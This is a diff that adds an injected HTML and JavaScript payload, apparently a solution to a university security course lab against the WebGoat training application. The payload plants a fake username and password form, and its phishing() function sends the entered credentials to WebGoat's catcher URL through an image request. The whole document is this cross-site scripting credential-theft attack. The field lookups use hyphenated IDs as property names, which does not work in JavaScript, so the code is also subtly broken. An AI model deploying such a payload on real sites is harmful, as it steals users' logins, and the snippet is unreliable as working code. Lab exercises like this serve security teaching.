@@ -1,0 +1,17 @@
+</form>
+<form id="ece568-2018f-form" method="post">
+    Username: <input type="text" id="ece568-2018f-username" value=""><br>
+    Password: <input type="password" id="ece568-2018f-password" value=""><br>
+    <input type="submit" id="ece568-2018f-submit" onclick="phishing()" value="submit">
+</form>
+
+<script type="text/javascript">
+function phishing() {
+    var xss_exploit = new Image();
+    var username = document.forms['ece568-2018f-form'].ece568-2018f-username.value;
+    var password = document.forms['ece568-2018f-form'].ece568-2018f-password.value;
+
+    xss_exploit.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&userText="
+                + username + "&passText=" + password;
+}
+</script>
